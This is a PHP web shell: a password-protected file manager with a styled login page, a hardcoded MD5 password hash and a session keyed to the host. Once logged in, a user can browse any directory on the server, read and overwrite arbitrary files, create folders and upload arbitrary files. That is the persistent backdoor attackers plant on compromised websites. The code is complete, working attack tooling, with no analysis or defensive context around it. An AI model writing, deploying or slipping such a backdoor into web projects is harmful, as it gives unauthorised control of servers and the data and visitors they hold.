<?php
session_start();
$password = "1e946439c43ac0bcfe7776b231e4b065";

function login_shell()
{
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
   <head>
      <meta charset="utf-8">
      <title>Balga Keleng</title>
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
      <style>
        @import url('https://fonts.googleapis.com/css?family=Poppins&display=swap');
*{
  margin: 0;
  padding: 0;
  font-family: 'Poppins',sans-serif;
}
body{
  display: flex;
  height: 100vh;
  text-align: center;
  align-items: center;
  justify-content: center;
  background: #151515;
}
.login-form{
  position: relative;
  width: 370px;
  height: auto;
  background: #1b1b1b;
  padding: 40px 35px 60px;
  box-sizing: border-box;
  border: 1px solid black;
  border-radius: 5px;
  box-shadow: 0px 0px 8px #339933;
}
.text{
  font-size: 30px;
  color: #c7c7c7;
  font-weight: 600;
  letter-spacing: 2px;
}

form{
  margin-top: 40px;
}
form .field{
  margin-top: 20px;
  display: flex;
}
.field .fas{
  height: 50px;
  width: 60px;
  color: #868686;
  font-size: 20px;
  line-height: 50px;
  border: 1px solid #444;
  border-right: none;
  border-radius: 5px 0 0 5px;
  background: linear-gradient(#333,#222);
}
.field input,form input[type="submit"]{
  height: 50px;
  width: 100%;
  outline: none;
  font-size: 19px;
  color: #868686;
  padding: 0 15px;
  border-radius: 0 5px 5px 0;
  border: 1px solid #444;
  caret-color: #339933;
  background: linear-gradient(#333,#222);
}
input:focus{
  color: #339933;
  box-shadow: 0 0 5px rgba(0,255,0,.2),
              inset 0 0 5px rgba(0,255,0,.1);
  background: linear-gradient(#333933,#222922);
  animation: glow .8s ease-out infinite alternate;
}
@keyframes glow {
   0%{
    border-color: #339933;
    box-shadow: 0 0 5px rgba(0,255,0,.2),
                inset 0 0 5px rgba(0,0,0,.1);
  }
   100%{
    border-color: #6f6;
    box-shadow: 0 0 20px rgba(0,255,0,.6),
                inset 0 0 10px rgba(0,255,0,.4);
  }
}
input[type="submit"]{
  margin-top: 30px;
  border-radius: 5px!important;
  font-weight: 600;
  letter-spacing: 1px;
  cursor: pointer;
}
input[type="submit"]:hover{
  color: #339933;
  border: 1px solid #339933;
  box-shadow: 0 0 5px rgba(0,255,0,.3),
              0 0 10px rgba(0,255,0,.2),
              0 0 15px rgba(0,255,0,.1),
              0 2px 0 black;
}
.link{
  margin-top: 25px;
  color: #868686;
}
.link a{
  color: #339933;
  text-decoration: none;
}
.link a:hover{
  text-decoration: underline;
}
      </style>
   </head>
   <body>
      <div class="login-form">
         <div class="text">
            PARBADA
         </div>
         <form action="" method="post">
            <div class="field">
               <div class="fas fa-lock"></div>
               <input type="password" name="pass" placeholder="Password">
            </div>
            <input type="submit" name="Login" value="Login"></input>
            <div class="link">
               Not a member?
               <a href="#">Signup now</a>
            </div>
		</form>
      </div>
   </body>
</html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Repository Kurlung</title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
    }
    #container {
        max-width: 800px;
        margin: 20px auto;
        padding: 20px;
        border: 1px solid #ccc;
        border-radius: 5px;
        background-color: #f9f9f9;
    }
    h1 {
        text-align: center;
        color: #333;
    }
    h2 {
        margin-top: 30px;
        color: #555;
    }
    ul {
        list-style-type: none;
        padding: 0;
    }
    li {
        margin-bottom: 10px;
    }
    a {
        text-decoration: none;
        color: #007bff;
    }
    a:hover {
        text-decoration: underline;
    }
    form {
        margin-top: 20px;
    }
    input[type="text"], input[type="file"], input[type="submit"] {
        margin-bottom: 10px;
    }
    hr {
        border: 0;
        height: 1px;
        background-color: #ccc;
        margin-top: 20px;
        margin-bottom: 20px;
    }
</style>
</head>
<body>
<div id="container">
    <h1 style="color: ;">Kurlung</h1>
    <?php
    // Function to clean input from unwanted characters
    function clean_input($input) {
        return htmlspecialchars(strip_tags($input));
    }

    // Function to navigate to the selected directory
    function navigate_directory($path) {
        $path = str_replace('\\','/', $path);
        $paths = explode('/', $path);
        $breadcrumbs = [];

        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                $breadcrumbs[] = '<a href="?path=/">/</a>';
                continue;
            }
            if ($pat == '') continue;
            $breadcrumbs[] = '<a href="?path=';
            for ($i = 0; $i <= $id; $i++) {
                $breadcrumbs[] = "$paths[$i]";
                if ($i != $id) $breadcrumbs[] = "/";
            }
            $breadcrumbs[] = '">'.$pat.'</a>/';
        }

        return implode('', $breadcrumbs);
    }

    // Function to display file or folder in the directory
    function display_directory_contents($path) {
        $contents = scandir($path);
        $folders = [];
        $files = [];

        foreach ($contents as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_path = $path . '/' . $item;
            if (is_dir($full_path)) {
                $folders[] = '<li><strong>Folder:</strong> <a href="?path=' . urlencode($full_path) . '">' . $item . '</a></li>';
            } else {
                $file_size = filesize($full_path); // Get file size
                $size_unit = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
                $file_size_formatted = $file_size ? round($file_size / pow(1024, ($i = floor(log($file_size, 1024)))), 2) . ' ' . $size_unit[$i] : '0 B'; // Format file size
                $files[] = '<li><strong>File:</strong> <a href="?action=edit&file=' . urlencode($item) . '&path=' . urlencode($path) . '">' . $item . '</a> (' . $file_size_formatted . ')</li>'; // Display file size
            }
        }

        // Display folder and file list with separator line
        echo '<ul>';
        echo implode('', $folders);
        if (!empty($folders) && !empty($files)) {
            echo '<hr>'; // Separator line if there are folders and files
        }
        echo implode('', $files);
        echo '</ul>';
    }

    // Function to create a new folder
    function create_folder($path, $folder_name) {
        $folder_name = clean_input($folder_name);
        $new_folder_path = $path . '/' . $folder_name;
        if (!file_exists($new_folder_path)) {
            mkdir($new_folder_path);
            echo "Folder '$folder_name' created successfully!";
        } else {
            echo "Folder '$folder_name' already exists!";
        }
    }

    // Function to upload a new file
    function upload_file($path, $file_to_upload) {
        $target_directory = $path . '/';
        $target_file = $target_directory . basename($file_to_upload['name']);
        $uploadOk = 1;

        // File upload process
        if (move_uploaded_file($file_to_upload['tmp_name'], $target_file)) {
            echo "File ". htmlspecialchars(basename($file_to_upload['name'])). " uploaded successfully.";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }

    // Function to display and edit file content
    function edit_file($file_path) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $content = $_POST['file_content'];
            if (file_put_contents($file_path, $content) !== false) {
                echo "File saved successfully.";
            } else {
                echo "There was an error while saving the file.";
            }
        }
        $content = file_get_contents($file_path);
        echo '<form method="post">';
        echo '<textarea name="file_content" rows="10" cols="50">' . htmlspecialchars($content) . '</textarea><br>';
        echo '<input type="submit" value="Save">';
        echo '</form>';
    }

    // Main program
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }

    if (isset($_GET['action'])) {
        $action = $_GET['action'];
        switch ($action) {
            case 'edit':
                if (isset($_GET['file'])) {
                    $file = $_GET['file'];
                    $file_path = $path . '/' . $file;
                    if (file_exists($file_path)) {
                        echo '<h2>Edit File: ' . $file . '</h2>';
                        edit_file($file_path);
                    } else {
                        echo "File not found.";
                    }
                } else {
                    echo "Invalid file.";
                }
                break;
            default:
                echo "Invalid action.";
        }
    } else {
        echo "<h2>Directory: " . $path . "</h2>";
        echo "<p>" . navigate_directory($path) . "</p>";
        echo "<h3>Directory Contents:</h3>";
        display_directory_contents($path);
        echo '<hr>'; // Separator line
        echo '<h3>Create New Folder:</h3>';
        echo '<form action="" method="post">';
        echo 'New Folder Name: <input type="text" name="folder_name">';
        echo '<input type="submit" name="create_folder" value="Create Folder">';
        echo '</form>';
        echo '<h3>Upload New File:</h3>';
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo 'Select file to upload: <input type="file" name="file_to_upload">';
        echo '<input type="submit" name="upload_file" value="Upload File">';
        echo '</form>';
    }

    // Handle request to create a new folder
    if(isset($_POST['create_folder'])) {
        create_folder($path, $_POST['folder_name']);
    }

    // Handle request to upload a new file
    if(isset($_POST['upload_file'])) {
        upload_file($path, $_FILES['file_to_upload']);
    }
    ?>
</div>
</body>
</html>